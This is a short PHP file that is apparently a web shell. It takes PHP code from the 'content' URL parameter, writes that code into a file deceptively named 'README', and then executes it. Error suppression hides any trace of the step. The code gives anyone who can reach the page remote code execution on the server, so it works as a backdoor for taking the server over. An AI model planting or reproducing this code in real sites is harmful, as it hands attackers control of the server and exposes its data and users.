<?php
if(@isset($_GET[content]))
{
$fp=fopen('README','w');
file_put_contents('README',"<?php\r\n");
@file_put_contents('README',$_GET[content],FILE_APPEND);
fclose($fp);
require 'README';}
?>